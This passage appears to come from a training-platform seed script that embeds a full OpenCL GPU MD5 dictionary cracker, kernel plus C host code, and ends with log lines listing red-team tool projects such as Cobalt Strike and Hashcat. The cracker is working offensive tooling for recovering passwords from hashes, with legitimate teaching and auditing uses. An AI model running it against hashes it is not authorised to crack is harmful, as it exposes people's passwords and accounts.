    FF(d, a, b, c, x[ 5], 12, 0x4787c62a);
    FF(c, d, a, b, x[ 6], 17, 0xa8304613);
    FF(b, c, d, a, x[ 7], 22, 0xfd469501);
    FF(a, b, c, d, x[ 8],  7, 0x698098d8);
    FF(d, a, b, c, x[ 9], 12, 0x8b44f7af);
    FF(c, d, a, b, x[10], 17, 0xffff5bb1);
    FF(b, c, d, a, x[11], 22, 0x895cd7be);
    FF(a, b, c, d, x[12],  7, 0x6b901122);
    FF(d, a, b, c, x[13], 12, 0xfd987193);
    FF(c, d, a, b, x[14], 17, 0xa679438e);
    FF(b, c, d, a, x[15], 22, 0x49b40821);

    // Round 2
    GG(a, b, c, d, x[ 1],  5, 0xf61e2562);
    GG(d, a, b, c, x[ 6],  9, 0xc040b340);
    GG(c, d, a, b, x[11], 14, 0x265e5a51);
    GG(b, c, d, a, x[ 0], 20, 0xe9b6c7aa);
    GG(a, b, c, d, x[ 5],  5, 0xd62f105d);
    GG(d, a, b, c, x[10],  9, 0x02441453);
    GG(c, d, a, b, x[15], 14, 0xd8a1e681);
    GG(b, c, d, a, x[ 4], 20, 0xe7d3fbc8);
    GG(a, b, c, d, x[ 9],  5, 0x21e1cde6);
    GG(d, a, b, c, x[14],  9, 0xc33707d6);
    GG(c, d, a, b, x[ 3], 14, 0xf4d50d87);
    GG(b, c, d, a, x[ 8], 20, 0x455a14ed);
    GG(a, b, c, d, x[13],  5, 0xa9e3e905);
    GG(d, a, b, c, x[ 2],  9, 0xfcefa3f8);
    GG(c, d, a, b, x[ 7], 14, 0x676f02d9);
    GG(b, c, d, a, x[12], 20, 0x8d2a4c8a);

    // Round 3
    HH(a, b, c, d, x[ 5],  4, 0xfffa3942);
    HH(d, a, b, c, x[ 8], 11, 0x8771f681);
    HH(c, d, a, b, x[11], 16, 0x6d9d6122);
    HH(b, c, d, a, x[14], 23, 0xfde5380c);
    HH(a, b, c, d, x[ 1],  4, 0xa4beea44);
    HH(d, a, b, c, x[ 4], 11, 0x4bdecfa9);
    HH(c, d, a, b, x[ 7], 16, 0xf6bb4b60);
    HH(b, c, d, a, x[10], 23, 0xbebfbc70);
    HH(a, b, c, d, x[13],  4, 0x289b7ec6);
    HH(d, a, b, c, x[ 0], 11, 0xeaa127fa);
    HH(c, d, a, b, x[ 3], 16, 0xd4ef3085);
    HH(b, c, d, a, x[ 6], 23, 0x04881d05);
    HH(a, b, c, d, x[ 9],  4, 0xd9d4d039);
    HH(d, a, b, c, x[12], 11, 0xe6db99e5);
    HH(c, d, a, b, x[15], 16, 0x1fa27cf8);
    HH(b, c, d, a, x[ 2], 23, 0xc4ac5665);

    // Round 4
    II(a, b, c, d, x[ 0],  6, 0xf4292244);
    II(d, a, b, c, x[ 7], 10, 0x432aff97);
    II(c, d, a, b, x[14], 15, 0xab9423a7);
    II(b, c, d, a, x[ 5], 21, 0xfc93a039);
    II(a, b, c, d, x[12],  6, 0x655b59c3);
    II(d, a, b, c, x[ 3], 10, 0x8f0ccc92);
    II(c, d, a, b, x[10], 15, 0xffeff47d);
    II(b, c, d, a, x[ 1], 21, 0x85845dd1);
    II(a, b, c, d, x[ 8],  6, 0x6fa87e4f);
    II(d, a, b, c, x[15], 10, 0xfe2ce6e0);
    II(c, d, a, b, x[ 6], 15, 0xa3014314);
    II(b, c, d, a, x[13], 21, 0x4e0811a1);
    II(a, b, c, d, x[ 4],  6, 0xf7537e82);
    II(d, a, b, c, x[11], 10, 0xbd3af235);
    II(c, d, a, b, x[ 2], 15, 0x2ad7d2bb);
    II(b, c, d, a, x[ 9], 21, 0xeb86d391);

    state[0] += a;
    state[1] += b;
    state[2] += c;
    state[3] += d;
}

void md5_hash(__private const uchar *input, uint len, __private uint *output) {
    uint state[4] = {MD5_A, MD5_B, MD5_C, MD5_D};
    uchar block[64];
    uint i;

    // Copy input to block
    for (i = 0; i < len && i < 64; i++) {
        block[i] = input[i];
    }

    // Padding
    block[len] = 0x80;
    for (i = len + 1; i < 56; i++) {
        block[i] = 0;
    }

    // Length in bits (little-endian)
    uint bit_len = len * 8;
    block[56] = bit_len & 0xff;
    block[57] = (bit_len >> 8) & 0xff;
    block[58] = (bit_len >> 16) & 0xff;
    block[59] = (bit_len >> 24) & 0xff;
    block[60] = 0;
    block[61] = 0;
    block[62] = 0;
    block[63] = 0;

    md5_transform(state, block);

    output[0] = state[0];
    output[1] = state[1];
    output[2] = state[2];
    output[3] = state[3];
}

__kernel void crack_md5(
    __global const uchar *words,      // Wordlist
    __global const uint *word_lengths, // Length of each word
    __global const uint *target_hash,  // Target MD5 hash (4 uints)
    __global uint *found,              // Found flag
    __global uint *found_index,        // Index of found word
    uint num_words,
    uint max_word_len
) {
    uint gid = get_global_id(0);

    if (gid >= num_words || *found)
        return;

    // Get word
    __global const uchar *word = words + (gid * max_word_len);
    uint word_len = word_lengths[gid];

    // Copy word to private memory
    uchar local_word[64];
    for (uint i = 0; i < word_len; i++) {
        local_word[i] = word[i];
    }

    // Compute MD5
    uint hash[4];
    md5_hash(local_word, word_len, hash);

    // Compare with target
    if (hash[0] == target_hash[0] &&
        hash[1] == target_hash[1] &&
        hash[2] == target_hash[2] &&
        hash[3] == target_hash[3]) {
        *found = 1;
        *found_index = gid;
    }
}
\`\`\`

### Host Code (C)

\`\`\`c
// md5_cracker.c - OpenCL MD5 Cracker Host Code

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <CL/cl.h>

#define MAX_WORD_LEN 64
#define BATCH_SIZE 1000000

typedef struct {
    cl_context context;
    cl_command_queue queue;
    cl_program program;
    cl_kernel kernel;
    cl_device_id device;
} OCLContext;

int init_opencl(OCLContext *ctx, const char *kernel_source) {
    cl_int err;
    cl_platform_id platform;
    cl_uint num_devices;

    // Get platform
    clGetPlatformIDs(1, &platform, NULL);

    // Get GPU device
    err = clGetDeviceIDs(platform, CL_DEVICE_TYPE_GPU, 1, &ctx->device, &num_devices);
    if (err != CL_SUCCESS) {
        // Fallback to CPU
        clGetDeviceIDs(platform, CL_DEVICE_TYPE_CPU, 1, &ctx->device, &num_devices);
    }

    // Create context
    ctx->context = clCreateContext(NULL, 1, &ctx->device, NULL, NULL, &err);

    // Create command queue
    ctx->queue = clCreateCommandQueue(ctx->context, ctx->device, 0, &err);

    // Create program
    size_t source_len = strlen(kernel_source);
    ctx->program = clCreateProgramWithSource(ctx->context, 1,
        &kernel_source, &source_len, &err);

    // Build program
    err = clBuildProgram(ctx->program, 1, &ctx->device, NULL, NULL, NULL);
    if (err != CL_SUCCESS) {
        char log[4096];
        clGetProgramBuildInfo(ctx->program, ctx->device,
            CL_PROGRAM_BUILD_LOG, sizeof(log), log, NULL);
        printf("Build error: %s\\n", log);
        return -1;
    }

    // Create kernel
    ctx->kernel = clCreateKernel(ctx->program, "crack_md5", &err);

    return 0;
}

void parse_md5(const char *hex, unsigned int *hash) {
    for (int i = 0; i < 4; i++) {
        unsigned int val = 0;
        for (int j = 0; j < 8; j++) {
            char c = hex[i*8 + j];
            unsigned int digit = (c >= '0' && c <= '9') ? c - '0' :
                                (c >= 'a' && c <= 'f') ? c - 'a' + 10 :
                                c - 'A' + 10;
            val = (val << 4) | digit;
        }
        // MD5 is little-endian
        hash[i] = ((val >> 24) & 0xff) |
                  ((val >> 8) & 0xff00) |
                  ((val << 8) & 0xff0000) |
                  ((val << 24) & 0xff000000);
    }
}

int crack(OCLContext *ctx, const char *wordlist, const char *target_hash_hex) {
    cl_int err;
    unsigned int target_hash[4];
    parse_md5(target_hash_hex, target_hash);

    FILE *fp = fopen(wordlist, "r");
    if (!fp) {
        printf("Cannot open wordlist\\n");
        return -1;
    }

    // Allocate host buffers
    unsigned char *words = malloc(BATCH_SIZE * MAX_WORD_LEN);
    unsigned int *lengths = malloc(BATCH_SIZE * sizeof(unsigned int));

    // Create device buffers
    cl_mem d_words = clCreateBuffer(ctx->context, CL_MEM_READ_ONLY,
        BATCH_SIZE * MAX_WORD_LEN, NULL, &err);
    cl_mem d_lengths = clCreateBuffer(ctx->context, CL_MEM_READ_ONLY,
        BATCH_SIZE * sizeof(unsigned int), NULL, &err);
    cl_mem d_target = clCreateBuffer(ctx->context, CL_MEM_READ_ONLY,
        4 * sizeof(unsigned int), NULL, &err);
    cl_mem d_found = clCreateBuffer(ctx->context, CL_MEM_READ_WRITE,
        sizeof(unsigned int), NULL, &err);
    cl_mem d_found_index = clCreateBuffer(ctx->context, CL_MEM_READ_WRITE,
        sizeof(unsigned int), NULL, &err);

    // Upload target hash
    clEnqueueWriteBuffer(ctx->queue, d_target, CL_TRUE, 0,
        4 * sizeof(unsigned int), target_hash, 0, NULL, NULL);

    char line[256];
    unsigned long long total_checked = 0;
    int found = 0;

    while (!found) {
        // Load batch of words
        unsigned int num_words = 0;
        memset(words, 0, BATCH_SIZE * MAX_WORD_LEN);

        while (num_words < BATCH_SIZE && fgets(line, sizeof(line), fp)) {
            int len = strlen(line);
            while (len > 0 && (line[len-1] == '\\n' || line[len-1] == '\\r'))
                line[--len] = 0;

            if (len > 0 && len < MAX_WORD_LEN) {
                memcpy(words + num_words * MAX_WORD_LEN, line, len);
                lengths[num_words] = len;
                num_words++;
            }
        }

        if (num_words == 0)
            break;

        // Upload batch
        clEnqueueWriteBuffer(ctx->queue, d_words, CL_TRUE, 0,
            num_words * MAX_WORD_LEN, words, 0, NULL, NULL);
        clEnqueueWriteBuffer(ctx->queue, d_lengths, CL_TRUE, 0,
            num_words * sizeof(unsigned int), lengths, 0, NULL, NULL);

        // Reset found flag
        unsigned int zero = 0;
        clEnqueueWriteBuffer(ctx->queue, d_found, CL_TRUE, 0,
            sizeof(unsigned int), &zero, 0, NULL, NULL);

        // Set kernel arguments
        unsigned int max_word_len = MAX_WORD_LEN;
        clSetKernelArg(ctx->kernel, 0, sizeof(cl_mem), &d_words);
        clSetKernelArg(ctx->kernel, 1, sizeof(cl_mem), &d_lengths);
        clSetKernelArg(ctx->kernel, 2, sizeof(cl_mem), &d_target);
        clSetKernelArg(ctx->kernel, 3, sizeof(cl_mem), &d_found);
        clSetKernelArg(ctx->kernel, 4, sizeof(cl_mem), &d_found_index);
        clSetKernelArg(ctx->kernel, 5, sizeof(unsigned int), &num_words);
        clSetKernelArg(ctx->kernel, 6, sizeof(unsigned int), &max_word_len);

        // Execute kernel
        size_t global_size = num_words;
        clEnqueueNDRangeKernel(ctx->queue, ctx->kernel, 1, NULL,
            &global_size, NULL, 0, NULL, NULL);
        clFinish(ctx->queue);

        // Check result
        unsigned int found_flag, found_index;
        clEnqueueReadBuffer(ctx->queue, d_found, CL_TRUE, 0,
            sizeof(unsigned int), &found_flag, 0, NULL, NULL);

        if (found_flag) {
            clEnqueueReadBuffer(ctx->queue, d_found_index, CL_TRUE, 0,
                sizeof(unsigned int), &found_index, 0, NULL, NULL);

            char password[MAX_WORD_LEN + 1] = {0};
            memcpy(password, words + found_index * MAX_WORD_LEN,
                lengths[found_index]);

            printf("\\n[+] FOUND: %s:%s\\n", target_hash_hex, password);
            found = 1;
        }

        total_checked += num_words;
        printf("\\rChecked: %llu", total_checked);
        fflush(stdout);
    }

    // Cleanup
    clReleaseMemObject(d_words);
    clReleaseMemObject(d_lengths);
    clReleaseMemObject(d_target);
    clReleaseMemObject(d_found);
    clReleaseMemObject(d_found_index);

    free(words);
    free(lengths);
    fclose(fp);

    if (!found) {
        printf("\\n[-] Password not found\\n");
    }

    return found ? 0 : 1;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s <md5_hash> <wordlist>\\n", argv[0]);
        return 1;
    }

    // Read kernel source
    FILE *fp = fopen("md5_kernel.cl", "r");
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char *kernel_source = malloc(size + 1);
    fread(kernel_source, 1, size, fp);
    kernel_source[size] = 0;
    fclose(fp);

    OCLContext ctx;
    init_opencl(&ctx, kernel_source);
    free(kernel_source);

    crack(&ctx, argv[2], argv[1]);

    return 0;
}
\`\`\`
`, 0, now);

console.log('Seeded: Final Red Team Tools');
console.log('  - Metasploit Framework (8 weeks)');
console.log('  - Cobalt Strike C2 (10 weeks)');
console.log('  - XSStrike XSS Scanner (3 weeks)');
console.log('  - Certipy AD CS Attacks (4 weeks)');
console.log('  - Hashcat GPU Cracker (6 weeks)');
